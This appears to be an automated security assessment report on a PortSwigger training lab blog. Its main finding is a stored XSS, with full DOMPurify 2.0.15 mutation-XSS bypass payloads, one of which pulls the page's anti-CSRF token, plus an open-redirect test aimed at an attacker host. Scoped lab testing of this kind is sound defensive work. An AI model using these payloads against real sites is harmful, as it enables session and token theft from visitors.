# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. HIGH — xss-stored Stored XSS in blog comment via DOMPurify 2.0.15 mutation-XSS bypass](#finding-1)
    - [2. LOW — burp? Open redirection (DOM-based)](#finding-2)
    - [3. LOW — burp Strict transport security not enforced (2 URLs)](#finding-3)
    - [4. INFO — burp TLS certificate](#finding-4)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mr6kk8hi-fr101h` |
| Target | https://0abb00c50377a549817352fe00530037.web-security-academy.net/ |
| Started | 2026-07-04T16:21:06.955Z |
| Generated | 2026-07-04T19:27:22.245Z |
| Phase | report |
| Screens | 11 mapped · 11 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 4 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `*.web-security-academy.net`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

4 finding(s): 1 high, 2 low, 1 info

## Findings

<a id="finding-1"></a>

### 1. [HIGH] [xss-stored] Stored XSS in blog comment via DOMPurify 2.0.15 mutation-XSS bypass

- Screen: `s-0002`
- Source: validator `claude-pilot`
- Scope basis: authorized target https://0abb00c50377a549817352fe00530037.web-security-academy.net/

The blog comment form (POST /post/comment) persists the `comment` field verbatim; the front-end fetches comments via GET /post/comment (JSON) and renders the comment body into the DOM through DOMPurify 2.0.15 (script at /resources/js/domPurify-2.0.15.js). DOMPurify < 2.0.17 is vulnerable to a namespace-confusion mutation-XSS (mXSS) bypass. A standard payload (<img src=x onerror=...>) is correctly stripped by DOMPurify (negative control: no execution), but the mutation payload <form><math><mtext></form><form><mglyph><style></math><img src onerror=...> survives sanitization and mutates on innerHTML assignment into an executing <img onerror>. The stored comment executes attacker JavaScript in the browser of EVERY visitor who views the post (persistent / cross-user). Confirmed by EXECUTION, not reflection: the payload document.title='PWNXSS'+40*50 set the document title to the COMPUTED value "PWNXSS2000". A follow-up stored payload read the DOM anti-CSRF token and exfiltrated it into the title ("vL8lDaJTkia8yqYqdBgsk6sxqL8tbMPp"), demonstrating full script access to the page (session/CSRF-token theft, actions on behalf of the victim). GET /post/comment returns the payload raw/unsanitized (no server-side output encoding); the only defense is the bypassable client-side DOMPurify.

**Reproduction**

```
1. Browse to /post?postId=1 and submit a comment with body: <form><math><mtext></form><form><mglyph><style></math><img src onerror="document.title='PWNXSS'+40*50"> (name/email required; the form auto-supplies a valid CSRF token). 2. Reload /post?postId=1; the loader renders the comment body via DOMPurify.sanitize(...) into innerHTML; the mXSS bypass mutates into <img onerror> and fires. 3. document.title becomes "PWNXSS2000" — the computed product 40*50 — proving JS execution. Negative control: a standard <img src=x onerror="document.title='CTRLXSS'+40*50"> leaves the title as "Mystery challenge" (DOMPurify strips it). Positive replays: GET /post/comment?postId=1 (ev-mr6lql0s-i, ev-mr6lqpaf-j) return the raw stored payload; control GET /post/comment?postId=2 (ev-mr6lqgrt-h) does not contain it. Impact shown: a third payload exfiltrated the page anti-CSRF token via document.title.
```

**Evidence**

- Evidence `ev-mr6lqgrt-h` — `artifacts/s-0002/ev-mr6lqgrt-h/`

Request:

```http
GET /post/comment?postId=2 HTTP/1.1
Host: 0abb00c50377a549817352fe00530037.web-security-academy.net
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 720
content-type: application/json; charset=utf-8
set-cookie: <redacted>
x-frame-options: SAMEORIGIN

[{"avatar":"","website":"","date":"2026-06-20T03:01:09.257Z","body":"Amusing, enticing and well put together. But enough from my dating profile, good blog","author":"Andy Tool"},{"avatar":"","website":"","date":"2026-06-25T06:58:53.943Z","body":"The next time I tell a stranger on the internet that they need to educate themselves, I'll send them a link to this.","author":"Jin Galbells"},{"avatar":"","website":"","date":"2026-06-26T03:20:15.611Z","body":"My best friend Steve ran off with my wife yesterday. Well, he's only been my best friend since yesterday.","author":"Neil Beforeme"},{"avatar":"","website":"","date":"2026-06-26T07:23:26.055Z","body":"I love that you write in that font.","author":"Carrie Atune"}]
```

- Evidence `ev-mr6lql0s-i` — `artifacts/s-0002/ev-mr6lql0s-i/`

Request:

```http
GET /post/comment?postId=1 HTTP/1.1
Host: 0abb00c50377a549817352fe00530037.web-security-academy.net
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1078
content-type: application/json; charset=utf-8
set-cookie: <redacted>
x-frame-options: SAMEORIGIN

[{"avatar":"","website":"","date":"2026-06-23T04:49:56.986Z","body":"Do you care what people think of you?","author":"Cindy Music"},{"avatar":"","website":"","date":"2026-07-02T17:33:59.456Z","body":"I found myself asking a lot of questions after reading this blog, like how many stops have I missed me station by?","author":"Bill Please"},{"avatar":"","website":"https://example.com","date":"2026-07-04T16:41:50.561510261Z","body":"Just a normal comment about resumes.","author":"BenignUser"},{"avatar":"","website":"","date":"2026-07-04T16:50:11.507025660Z","body":"<img src=x onerror=\"document.title='CTRLXSS'+40*50\">","author":"ctrluser"},{"avatar":"","website":"","date":"2026-07-04T16:50:44.340917328Z","body":"<form><math><mtext><\/form><form><mglyph><style><\/math><img src onerror=\"document.title='PWNXSS'+40*50\">","author":"posuser"},{"avatar":"","website":"","date":"2026-07-04T16:52:30.154608598Z","body":"<form><math><mtext><\/form><form><mglyph><style><\/math><img src onerror=\"document.title=document.querySelector('[name=csrf]').value\">","author":"exfil"}]
```

- Evidence `ev-mr6lqpaf-j` — `artifacts/s-0002/ev-mr6lqpaf-j/`

Request:

```http
GET /post/comment?postId=1 HTTP/1.1
Host: 0abb00c50377a549817352fe00530037.web-security-academy.net
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1078
content-type: application/json; charset=utf-8
set-cookie: <redacted>
x-frame-options: SAMEORIGIN

[{"avatar":"","website":"","date":"2026-06-23T04:49:56.986Z","body":"Do you care what people think of you?","author":"Cindy Music"},{"avatar":"","website":"","date":"2026-07-02T17:33:59.456Z","body":"I found myself asking a lot of questions after reading this blog, like how many stops have I missed me station by?","author":"Bill Please"},{"avatar":"","website":"https://example.com","date":"2026-07-04T16:41:50.561510261Z","body":"Just a normal comment about resumes.","author":"BenignUser"},{"avatar":"","website":"","date":"2026-07-04T16:50:11.507025660Z","body":"<img src=x onerror=\"document.title='CTRLXSS'+40*50\">","author":"ctrluser"},{"avatar":"","website":"","date":"2026-07-04T16:50:44.340917328Z","body":"<form><math><mtext><\/form><form><mglyph><style><\/math><img src onerror=\"document.title='PWNXSS'+40*50\">","author":"posuser"},{"avatar":"","website":"","date":"2026-07-04T16:52:30.154608598Z","body":"<form><math><mtext><\/form><form><mglyph><style><\/math><img src onerror=\"document.title=document.querySelector('[name=csrf]').value\">","author":"exfil"}]
```

<a id="finding-2"></a>

### 2. [LOW] [burp?] Open redirection (DOM-based)

- Screen: `(cross-screen)`
- Source: validator `burp`
- Scope basis: burp scan (in-scope)

⚠ AI re-test could not reproduce (severity kept, manual confirmation advised): DOM-based finding: control (postId=1) and both attack requests (url=/redirect= to attacker host) all returned an identical 200 with 10649-byte body and NO Location header / no 3xx — no server-side redirect effect exists to reproduce via raw HTTP; a DOM redirect only fires in a JS engine, so automated re-test cannot confirm it (kept for manual browser review).

The application may be vulnerable to DOM-based open redirection. Data is read from <b>location.search</b> and passed to <b>xhr.open</b>. (confidence: TENTATIVE) @ https://0abb00c50377a549817352fe00530037.web-security-academy.net/post

**Reproduction**

```
Detected by Burp. Evidence contains the request/response (Cookie/Authorization redacted).
```

**Evidence**

- Evidence `ev-mr6r5ls8-80` — `artifacts/_/ev-mr6r5ls8-80/`

Request:

```http
GET /post HTTP/1.1
Host: 0abb00c50377a549817352fe00530037.web-security-academy.net

GET /post?postId=1 HTTP/1.1
Host: 0abb00c50377a549817352fe00530037.web-security-academy.net
Accept: */*
```

Response:

```http
HTTP/1.1 0

HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 10649

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner is-solved'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='UGVyZm9ybSBhbiBYU1MgYXR0YWNrIHRoYXQgY2F1c2VzIEJ1cnAncyBicm93c2VyIChvciBDaHJvbWUpIHRvIGNhbGwgdGhlIDxjb2RlPmFsZXJ0KCk8L2NvZGU+IGZ1bmN0aW9uLg==' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L2RvbS1iYXNlZC9kb20tY2xvYmJlcmluZy9sYWItZG9tLXhzcy1leHBsb2l0aW5nLWRvbS1jbG9iYmVyaW5n'>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-solved'>
                            <span>LAB</span>
                            <p>Solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
            <section id=notification-labsolved class=notification-labsolved>
                <div class=container>
                    <h4>Congratulations, you solved the lab!</h4>
                    <div>
                        <span>
                            Share your skills!
                        </span>
                        <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2fdom-based%2fdom-clobbering%2flab-dom-xss-exploiting-dom-clobbering&related=WebSecAcademy,Burp_Suite'>
                    <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
                        <title>twitter-button</title>
                        <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
                    </svg>
                        </a>
                        <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fdom-based%2fdom-clobbering%2flab-dom-xss-exploiting-dom-clobbering'>
                    <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
                        <title>linkedin-button</title>
                        <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
                    </svg>
                        </a>
                        <a href='https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering'>
                            Continue learning 
                            <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                <g>
                                    <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                    <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                </g>
                            </svg>
                        </a>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="blog">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <div class="blog-post">
                    <img src="/image/blog/posts/21.jpg">
                    <h1>The Do&apos;s &amp; Don&apos;ts of Writing Your Resume</h1>
                    <p><span id=blog-author>Dean N&apos;Mean</span> | 10 June 2026</p>
                    <hr>
                    <p>We all know how extremely important first impressions are, especially in the business world. Your resume is your handshake to your future employer, don&apos;t make it a sweaty limp one.</p>
                    <p>The first thing to remember is don&apos;t try and be funny in your job descriptions. If you&apos;ve been working with children the employer doesn&apos;t want to read &apos;could have given them a smack most days, but loved them really&apos;. They will think it only a matter of time before you reach breaking point and this could become a reality.</p>
                    <p>Swearing is usually frowned upon. Just because you&apos;ve seen all those memes on facebook stating that people who swear have the highest intelligence doesn&apos;t mean it&apos;s true, or that you should use bad language in your profile.</p>
                    <p>If you are presenting a hard copy of your resume at interview your future boss doesn&apos;t want to see what you had for breakfast. It is quite possible they have allergies, or could be vegan, and that little bit of bacon fat stuck to your educational history could really put them off you.</p>
                    <p>Don&apos;t include anything you can&apos;t live up to. Applying to become a ski instructor when you can&apos;t ski could be problematic, and quite a bit dangerous. Imagine being put to the test at an interview of everything you have listed as a skill, if you can&apos;t do it don&apos;t include it. Picture everyone&apos;s embarrassment when you have stated you can &apos;do it blindfolded&apos; and you knock over the 15th-century porcelain vase contai
```

- Evidence `ev-mr6r6ptl-82` — `artifacts/_/ev-mr6r6ptl-82/`

Request:

```http
GET /post?postId=1 HTTP/1.1
Host: 0abb00c50377a549817352fe00530037.web-security-academy.net
user-agent: verdict-scanner/0.1
```

Response:

```http
HTTP/1.1 200
connection: close
content-encoding: gzip
content-length: 3689
content-type: text/html; charset=utf-8
set-cookie: <redacted>
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner is-solved'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='UGVyZm9ybSBhbiBYU1MgYXR0YWNrIHRoYXQgY2F1c2VzIEJ1cnAncyBicm93c2VyIChvciBDaHJvbWUpIHRvIGNhbGwgdGhlIDxjb2RlPmFsZXJ0KCk8L2NvZGU+IGZ1bmN0aW9uLg==' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L2RvbS1iYXNlZC9kb20tY2xvYmJlcmluZy9sYWItZG9tLXhzcy1leHBsb2l0aW5nLWRvbS1jbG9iYmVyaW5n'>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-solved'>
                            <span>LAB</span>
                            <p>Solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
            <section id=notification-labsolved class=notification-labsolved>
                <div class=container>
                    <h4>Congratulations, you solved the lab!</h4>
                    <div>
                        <span>
                            Share your skills!
                        </span>
                        <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2fdom-based%2fdom-clobbering%2flab-dom-xss-exploiting-dom-clobbering&related=WebSecAcademy,Burp_Suite'>
                    <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
                        <title>twitter-button</title>
                        <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
                    </svg>
                        </a>
                        <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fdom-based%2fdom-clobbering%2flab-dom-xss-exploiting-dom-clobbering'>
                    <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
                        <title>linkedin-button</title>
                        <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
                    </svg>
                        </a>
                        <a href='https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering'>
                            Continue learning 
                            <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                <g>
                                    <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                    <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                </g>
                            </svg>
                        </a>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="blog">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <div class="blog-post">
                    <img src="/image/blog/posts/21.jpg">
                    <h1>The Do&apos;s &amp; Don&apos;ts of Writing Your Resume</h1>
                    <p><span id=blog-author>Dean N&apos;Mean</span> | 10 June 2026</p>
                    <hr>
                    <p>We all know how extremely important first impressions are, especially in the business world. Your resume is your handshake to your future employer, don&apos;t make it a sweaty limp one.</p>
                    <p>The first thing to remember is don&apos;t try and be funny in your job descriptions. If you&apos;ve been working with children the employer doesn&apos;t want to read &apos;could have given them a smack most days, but loved them really&apos;. They will think it only a matter of time before you reach breaking point and this could become a reality.</p>
                    <p>Swearing is usually frowned upon. Just because you&apos;ve seen all those memes on facebook stating that people who swear have the highest intelligence doesn&apos;t mean it&apos;s true, or that you should use bad language in your profile.</p>
                    <p>If you are presenting a hard copy of your resume at interview your future boss doesn&apos;t want to see what you had for breakfast. It is quite possible they have allergies, or could be vegan, and that little bit of bacon fat stuck to your educational history could really put them off you.</p>
                    <p>Don&apos;t include anything you can&apos;t live up to. Applying to become a ski instructor when you can&apos;t ski could be problematic, and quite a bit dangerous. Imagine being put to the test at an interview of everything you have listed as a skill, if you can&apos;t do it don&apos;t include it. Picture everyone&apos;s embarrassment when you have stated you can &apos;do it blindfolded&apos; and you knock over the 15th-century porcelain vase containing the interviewer&apos;s mother&apos;s ashes.</p>
                    <p>It is not enough to just give your previous job title, it is important to give a short description of your duties. The job description might suggest the company is &apos;laid back&apos;, and they &apos;enjoy the camaraderie of team spirit&apos;, but this does not mean you describe how you were the one who always photocopied your fanny at the Christmas party. Keep it specific to what you were paid for. That does not include adding all the boozy lunches you had with clients on expenses, or how you used company funds to take them on to a lap dancing club. This is NOT what they mean by laid back or camaraderie.</p>
                    <p>Ask yourself, would you employ you? If the answer is yes then you probably need to rewrite your resume until it reads like someone you wouldn&apos;t employ.</p>
                    <div/>
                    <hr>
                    <h1>Comments</h1>
                    <span id='user-comments'>
                    <script src='/resources/js/domPurify-2.0.15.js'></script>
                    <script src='/resources/js/loadCommentsWithDomClobbering.js'></script>
                    <script>loadComments('/post/comment')</script>
                    </span>
                    <hr>
                    <section class="add-comment">
                        <h2>Leave a comment</h2>
                        <form action="/post/comment" method="POST" enctype="application/x-www-form-urlencoded">
                            <input required type="hidden" name="csrf" value="CI4QRpHaDkvm7mL5oyJmuJCykvcKyypg">
                            <input required type="hidden" name="postId" value="1">
                            <label>Comment:</label>
                            <div>HTML is allowed</div>
                            <textarea required rows="12" cols="300" name="comment"></textarea>
                                    <label>Name:</label>
                                    <input required type="text" name="name">
                                    <label>Email:</label>
                                    <input required type="email" name="email">
                                    <label>Website:</label>
                                    <input pattern="(http:|https:).+" type="text" name="website">
                            <button class="button" type="submit">Post Comment</button>
                        </form>
                    </section>
                    <div class="is-linkback">
                        <a href="/">Back to Blog</a>
                    </div>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

- Evidence `ev-mr6r7b27-83` — `artifacts/_/ev-mr6r7b27-83/`

Request:

```http
GET /post?postId=1&url=https://evil-attacker.example/ HTTP/1.1
Host: 0abb00c50377a549817352fe00530037.web-security-academy.net
user-agent: verdict-scanner/0.1
```

Response:

```http
HTTP/1.1 200
connection: close
content-encoding: gzip
content-length: 3687
content-type: text/html; charset=utf-8
set-cookie: <redacted>
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner is-solved'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='UGVyZm9ybSBhbiBYU1MgYXR0YWNrIHRoYXQgY2F1c2VzIEJ1cnAncyBicm93c2VyIChvciBDaHJvbWUpIHRvIGNhbGwgdGhlIDxjb2RlPmFsZXJ0KCk8L2NvZGU+IGZ1bmN0aW9uLg==' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L2RvbS1iYXNlZC9kb20tY2xvYmJlcmluZy9sYWItZG9tLXhzcy1leHBsb2l0aW5nLWRvbS1jbG9iYmVyaW5n'>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-solved'>
                            <span>LAB</span>
                            <p>Solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
            <section id=notification-labsolved class=notification-labsolved>
                <div class=container>
                    <h4>Congratulations, you solved the lab!</h4>
                    <div>
                        <span>
                            Share your skills!
                        </span>
                        <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2fdom-based%2fdom-clobbering%2flab-dom-xss-exploiting-dom-clobbering&related=WebSecAcademy,Burp_Suite'>
                    <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
                        <title>twitter-button</title>
                        <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
                    </svg>
                        </a>
                        <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fdom-based%2fdom-clobbering%2flab-dom-xss-exploiting-dom-clobbering'>
                    <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
                        <title>linkedin-button</title>
                        <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
                    </svg>
                        </a>
                        <a href='https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering'>
                            Continue learning 
                            <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                <g>
                                    <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                    <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                </g>
                            </svg>
                        </a>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="blog">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <div class="blog-post">
                    <img src="/image/blog/posts/21.jpg">
                    <h1>The Do&apos;s &amp; Don&apos;ts of Writing Your Resume</h1>
